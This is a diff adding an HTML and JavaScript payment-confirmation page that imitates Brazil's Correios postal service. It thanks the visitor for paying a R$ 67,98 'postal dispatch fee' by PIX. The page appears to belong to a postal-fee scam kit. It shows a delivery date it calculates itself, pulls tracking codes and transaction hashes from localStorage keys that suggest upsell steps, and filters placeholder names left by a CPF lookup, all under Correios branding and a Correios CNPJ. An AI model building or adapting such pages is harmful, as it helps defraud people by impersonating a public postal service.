@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#16a34a">
+    <meta name="description" content="Pagamento Confirmado - Correios">
+
+    <title>Pagamento Confirmado - Correios</title>
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/webp" href="assets/images/favicon.webp">
+
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5" as="style">
+    <link rel="preload" href="assets/css/sucesso.css?v=2.1.1" as="style">
+
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-solid-900.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="assets/vendor/fontawesome/6.5.1/webfonts/fa-regular-400.woff2?v=subset-5" as="font" type="font/woff2" crossorigin>
+
+    <style id="critical-inline">
+      *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+      html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;overflow-x:hidden}
+      body{line-height:1.5;background:#fff;color:#003f6b;min-height:100vh;display:flex;flex-direction:column}
+      img{max-width:100%;height:auto;display:block}
+      a{color:inherit;text-decoration:none}
+      button{cursor:pointer;border:0;background:none}
+      .main{flex:1;max-width:480px;margin:0 auto;padding:1rem;width:100%}
+      .header{background:#f4f6f8;border-bottom:3px solid #ffd400}
+      .header-nav{display:flex;align-items:center;justify-content:center;max-width:1200px;margin:0 auto;padding:.375rem 1rem;min-height:40px}
+      .logo-correios{height:25px;width:auto;display:block}
+      .btn-entrar{display:none}
+      .header-nav.has-user-name{justify-content:space-between}
+      .header-nav.has-user-name .btn-entrar{display:flex;align-items:center;gap:.5rem}
+      .footer{background:#fdd306;color:#1e3a5f;padding:1.5rem 1rem}
+      .footer-container{max-width:1000px;margin:0 auto}
+      .footer-links{display:none}
+      .footer-bottom{display:flex;flex-direction:column;align-items:center}
+      .footer-logos{display:flex;align-items:center;justify-content:center;gap:2rem}
+      .footer-logos .logo-footer{height:5.5rem;width:auto;max-width:100%;object-fit:contain}
+      .footer-copyright{text-align:center;font-size:.7rem;color:#014268;margin-bottom:0}
+      .loader,#loader{display:flex;align-items:center;justify-content:center;min-height:50vh}
+      [hidden]{display:none!important}
+    </style>
+    <!-- Font Awesome Pro -->
+    <link rel="stylesheet" href="assets/vendor/fontawesome/6.5.1/css/all.min.css?v=subset-5">
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="assets/css/sucesso.css?v=2.1.1">
+
+</head>
+<body>
+    <!-- ========================================
+         HEADER
+    ======================================== -->
+    <header class="header">
+        <nav class="header-nav" id="headerNav">
+            <a href="#" class="logo-link">
+                <img src="assets/images/correios.webp" alt="Correios" class="logo-correios" width="121" height="25" decoding="async" fetchpriority="high">
+            </a>
+            <a href="#" class="btn-entrar">
+                <img src="assets/images/entrar.svg" alt="Entrar" class="icon-entrar" width="20" height="20" decoding="async">
+                <span class="user-name">Entrar</span>
+            </a>
+        </nav>
+    </header>
+
+    <!-- ========================================
+         MAIN
+    ======================================== -->
+    <main class="main">
+        <!-- Banner de Sucesso -->
+        <div class="success-banner">
+            <div class="success-confetti"></div>
+            <div class="success-icon-wrapper">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <div class="success-ring"></div>
+            </div>
+            <h1 class="success-title">Pagamento Confirmado!</h1>
+            <p class="success-subtitle">Sua taxa foi paga com sucesso</p>
+        </div>
+
+        <!-- Container Principal -->
+        <div class="success-wrapper">
+            <!-- Card de Status -->
+            <div class="status-card">
+                <div class="status-header">
+                    <div class="status-badge">
+                        <i class="fas fa-shield-check"></i>
+                        <span>Transação Aprovada</span>
+                    </div>
+                    <span class="status-id" id="transacaoId">---</span>
+                </div>
+
+                <div class="status-timeline">
+                    <div class="timeline-item completed">
+                        <div class="timeline-dot">
+                            <i class="fas fa-check"></i>
+                        </div>
+                        <div class="timeline-content">
+                            <strong>Pagamento Recebido</strong>
+                            <span>PIX confirmado pelo banco</span>
+                        </div>
+                    </div>
+                    <div class="timeline-item completed">
+                        <div class="timeline-dot">
+                            <i class="fas fa-check"></i>
+                        </div>
+                        <div class="timeline-content">
+                            <strong>Taxa Processada</strong>
+                            <span>Liberação autorizada</span>
+                        </div>
+                    </div>
+                    <div class="timeline-item active">
+                        <div class="timeline-dot">
+                            <i class="fas fa-truck"></i>
+                        </div>
+                        <div class="timeline-content">
+                            <strong>Em Trânsito</strong>
+                            <span>Encomenda a caminho</span>
+                        </div>
+                    </div>
+                    <div class="timeline-item pending">
+                        <div class="timeline-dot">
+                            <i class="fas fa-home"></i>
+                        </div>
+                        <div class="timeline-content">
+                            <strong>Entrega</strong>
+                            <span>Aguardando chegada</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Informações da Encomenda -->
+            <div class="info-grid">
+                <div class="info-card rastreio">
+                    <div class="info-icon">
+                        <i class="fas fa-barcode"></i>
+                    </div>
+                    <div class="info-content">
+                        <span class="info-label">Código de Rastreio</span>
+                        <strong class="info-value" id="codigoRastreio">---</strong>
+                    </div>
+                    <button class="btn-copy-small" onclick="copiarRastreio()" title="Copiar código">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+
+                <div class="info-card previsao">
+                    <div class="info-icon">
+                        <i class="fas fa-calendar-check"></i>
+                    </div>
+                    <div class="info-content">
+                        <span class="info-label">Previsão de Entrega</span>
+                        <strong class="info-value" id="previsaoEntrega">Carregando...</strong>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Próximos Passos -->
+            <div class="next-steps">
+                <h3><i class="fas fa-route"></i> Próximos Passos</h3>
+                <div class="steps-list">
+                    <div class="step-card">
+                        <div class="step-number">1</div>
+                        <div class="step-info">
+                            <strong>Acompanhe sua encomenda</strong>
+                            <p>Use o código de rastreio para verificar o status no site dos Correios</p>
+                        </div>
+                    </div>
+                    <div class="step-card">
+                        <div class="step-number">2</div>
+                        <div class="step-info">
+                            <strong>Aguarde a entrega</strong>
+                            <p>Sua encomenda será entregue no endereço cadastrado</p>
+                        </div>
+                    </div>
+                    <div class="step-card">
+                        <div class="step-number">3</div>
+                        <div class="step-info">
+                            <strong>Confira o conteúdo</strong>
+                            <p>Ao receber, verifique se está tudo correto com seu pedido</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Recibo -->
+            <div class="receipt-card">
+                <div class="receipt-header">
+                    <i class="fas fa-receipt"></i>
+                    <span>Comprovante de Pagamento</span>
+                </div>
+                <div class="receipt-body">
+                    <div class="receipt-row">
+                        <span>Descrição</span>
+                        <strong>Taxa de Despacho Postal</strong>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Valor Pago</span>
+                        <strong class="valor-destaque">R$ 67,98</strong>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Método</span>
+                        <strong>PIX</strong>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Data/Hora</span>
+                        <strong id="dataHoraPagamento">---</strong>
+                    </div>
+                </div>
+                <div class="receipt-footer">
+                    <button class="btn-print" onclick="window.print()">
+                        <i class="fas fa-print"></i>
+                        Imprimir Comprovante
+                    </button>
+                </div>
+            </div>
+
+            <!-- Segurança -->
+            <div class="security-footer">
+                <div class="security-item">
+                    <i class="fas fa-lock"></i>
+                    <span>Pagamento Seguro</span>
+                </div>
+                <div class="security-item">
+                    <i class="fas fa-file-certificate"></i>
+                    <span>Comprovante Oficial</span>
+                </div>
+                <div class="security-item">
+                    <i class="fas fa-headset"></i>
+                    <span>Suporte 24h</span>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- ========================================
+         FOOTER
+    ======================================== -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-links">
+                <div class="footer-section">
+                    <h4>Fale Conosco</h4>
+                    <ul>
+                        <li><i class="far fa-desktop"></i> Registro de Manifestações</li>
+                        <li><i class="far fa-question-square"></i> Central de Atendimento</li>
+                        <li><i class="far fa-briefcase"></i> Soluções para o seu negócio</li>
+                        <li><i class="far fa-headset"></i> Suporte ao cliente com contrato</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Ouvidoria</li>
+                        <li><i class="far fa-user-headset"></i> Denúncia</li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Sobre os Correios</h4>
+                    <ul>
+                        <li><i class="far fa-address-card"></i> Identidade corporativa</li>
+                        <li><i class="far fa-user-graduate"></i> Educação e cultura</li>
+                        <li><i class="far fa-book-alt"></i> Código de ética</li>
+                        <li><i class="far fa-comment-alt-dots"></i> Política de privacidade e Notas legais</li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Outros Sites</h4>
+                    <ul>
+                        <li><i class="far fa-shopping-cart"></i> Loja online dos correios</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="footer-logos">
+                    <img src="assets/images/logo-rodape.webp" alt="Correios e Receita Federal" class="logo-footer" width="383" height="88" decoding="async">
+                </div>
+                <p class="footer-copyright">© Copyright 2026 Correios<br>CNPJ 34.028.316/0001-03</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Toast de Copiado -->
+    <div class="toast" id="toast">
+        <i class="fas fa-check-circle"></i>
+        <span>Código copiado!</span>
+    </div>
+
+    <script>
+        function decodificarNome(nome) {
+            if (!nome) return nome;
+            try {
+                let decoded = nome;
+                while (decoded.includes('%')) {
+                    const newDecoded = decodeURIComponent(decoded);
+                    if (newDecoded === decoded) break;
+                    decoded = newDecoded;
+                }
+                return decoded;
+            } catch (e) {
+                return nome;
+            }
+        }
+
+        function validarNomeHeader(nome) {
+            if (!nome) return false;
+            const nomeUpper = nome.toUpperCase().trim();
+            const nomesInvalidos = ['CPF LOCALIZADO', 'CPF ENCONTRADO', 'TITULAR', 'USUARIO', 'USUÁRIO', 'CLIENTE', 'PREZADO', 'DESTINATÁRIO', 'DESTINATARIO', '---'];
+            return !nomesInvalidos.some(invalido => nomeUpper.includes(invalido));
+        }
+
+        function exibirNomeHeader() {
+            const nome = localStorage.getItem('correios_nome');
+            const nomeDecodificado = decodificarNome(nome);
+            if (!validarNomeHeader(nomeDecodificado)) return;
+            const headerNav = document.getElementById('headerNav');
+            const userNameEl = document.querySelector('.btn-entrar .user-name');
+            if (!headerNav || !userNameEl) return;
+            const primeiroNome = nomeDecodificado.trim().split(/\s+/)[0];
+            const formatado = primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1).toLowerCase();
+            userNameEl.textContent = 'Olá, ' + formatado;
+            headerNav.classList.add('has-user-name');
+        }
+
+        function getPrevisaoEntrega() {
+            const previsaoSalva = localStorage.getItem('correios_previsao_entrega');
+            if (previsaoSalva) return previsaoSalva;
+            const hoje = new Date();
+            let diasAdicionados = 0;
+            while (diasAdicionados < 5) {
+                hoje.setDate(hoje.getDate() + 1);
+                const diaSemana = hoje.getDay();
+                if (diaSemana !== 0 && diaSemana !== 6) diasAdicionados++;
+            }
+            const dia = hoje.getDate().toString().padStart(2, '0');
+            const mes = (hoje.getMonth() + 1).toString().padStart(2, '0');
+            const ano = hoje.getFullYear();
+            const diasSemana = ['Domingo', 'Segunda', 'Terça', 'Quarta', 'Quinta', 'Sexta', 'Sábado'];
+            return `${diasSemana[hoje.getDay()]}, ${dia}/${mes}/${ano}`;
+        }
+
+        function getCodigoRastreio() {
+            const rastreioSalvo = localStorage.getItem('correios_rastreio');
+            if (rastreioSalvo) return rastreioSalvo;
+            const urlParams = new URLSearchParams(window.location.search);
+            const rastreioUrl = urlParams.get('rastreio');
+            if (rastreioUrl) return rastreioUrl;
+            try {
+                const sessionData = localStorage.getItem('correios_session');
+                if (sessionData) {
+                    const parsed = JSON.parse(sessionData);
+                    if (parsed.codigoRastreio) return parsed.codigoRastreio;
+                }
+            } catch (e) {}
+            return null;
+        }
+
+        function formatarRastreio(codigo) {
+            if (!codigo) return 'Aguardando atribuição';
+            codigo = codigo.replace(/\s/g, '').toUpperCase();
+            if (codigo.length === 13 && /^[A-Z]{2}\d{9}[A-Z]{2}$/.test(codigo)) {
+                return codigo.replace(/([A-Z]{2})(\d{3})(\d{3})(\d{3})([A-Z]{2})/, '$1 $2 $3 $4 $5');
+            }
+            return codigo;
+        }
+
+        function getTransacaoId() {
+            const transactionKeys = ['correios_pix_transaction', 'correios_up1_transaction', 'correios_up2_transaction', 'correios_lote_transaction'];
+            for (const key of transactionKeys) {
+                try {
+                    const data = localStorage.getItem(key);
+                    if (data) {
+                        const parsed = JSON.parse(data);
+                        if (parsed.hash) return parsed.hash.toUpperCase();
+                    }
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        function persistPaidHashes() {
+            const transactionKeys = [
+                ['correios_pix_transaction', 'correios_frontend_paid_hash'],
+                ['correios_up1_transaction', 'correios_up1_paid_hash'],
+                ['correios_up2_transaction', 'correios_up2_paid_hash']
+            ];
+            for (const [transactionKey, paidHashKey] of transactionKeys) {
+                try {
+                    const data = localStorage.getItem(transactionKey);
+                    if (!data) continue;
+                    const parsed = JSON.parse(data);
+                    const hash = String(parsed && parsed.hash || '').trim();
+                    if (!hash) continue;
+                    localStorage.setItem(paidHashKey, hash);
+                    localStorage.setItem('correios_last_paid_hash', hash);
+                    return;
+                } catch (e) {}
+            }
+        }
+
+        function formatarDataHora() {
+            const agora = new Date();
+            const dia = agora.getDate().toString().padStart(2, '0');
+            const mes = (agora.getMonth() + 1).toString().padStart(2, '0');
+            const ano = agora.getFullYear();
+            const hora = agora.getHours().toString().padStart(2, '0');
+            const minuto = agora.getMinutes().toString().padStart(2, '0');
+            return `${dia}/${mes}/${ano} às ${hora}:${minuto}`;
+        }
+
+        function copiarRastreio() {
+            const codigo = document.getElementById('codigoRastreio').textContent;
+            navigator.clipboard.writeText(codigo.replace(/\s/g, '')).then(() => { mostrarToast(); });
+        }
+
+        function mostrarToast() {
+            const toast = document.getElementById('toast');
+            toast.classList.add('show');
+            setTimeout(() => { toast.classList.remove('show'); }, 2000);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            exibirNomeHeader();
+            document.getElementById('previsaoEntrega').textContent = getPrevisaoEntrega();
+            document.getElementById('codigoRastreio').textContent = formatarRastreio(getCodigoRastreio());
+            document.getElementById('dataHoraPagamento').textContent = formatarDataHora();
+            const transacaoId = getTransacaoId();
+            if (transacaoId) {
+                document.getElementById('transacaoId').textContent = '#' + transacaoId.substring(0, 8);
+            }
+            persistPaidHashes();
+            setTimeout(() => {
+                localStorage.removeItem('correios_pix_transaction');
+                localStorage.removeItem('correios_up1_transaction');
+                localStorage.removeItem('correios_up2_transaction');
+                localStorage.removeItem('correios_lote_transaction');
+            }, 2000);
+        });
+    </script></body>
+</html>
